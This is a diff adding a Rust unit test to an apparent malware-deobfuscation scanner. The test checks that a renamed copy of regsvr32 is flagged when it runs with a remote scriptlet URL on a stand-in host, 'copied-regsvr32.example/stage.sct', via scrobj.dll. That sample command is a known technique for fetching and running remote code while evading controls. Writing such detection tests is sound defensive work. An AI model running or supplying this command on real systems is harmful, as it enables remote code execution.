@@ -15471,6 +15471,53 @@ C:\Users\Public\cu.tmp -K curl.cfg
     }
 
     #[test]
+    fn copied_regsvr32_alias_in_deob_text_emits_scriptlet_url_argument() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\regsvr32.exe scrub.pif".to_string(),
+            src: "c:\\windows\\system32\\regsvr32.exe".to_string(),
+            dst: "scrub.pif".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"scrub.pif /s /n /u /i:https://copied-regsvr32.example/stage.sct scrobj.dll"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. } if target == "scrub.pif"
+                )
+            }),
+            "copied regsvr32 alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "regsvr32.exe /s /n /u /i:https://copied-regsvr32.example/stage.sct scrobj.dll"
+                            && url == "https://copied-regsvr32.example/stage.sct"
+                )
+            }),
+            "copied regsvr32 alias did not replay scriptlet URL: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-regsvr32.example/stage.sct"
+                )
+            }),
+            "copied regsvr32 URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_style_compact_flags_exe_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
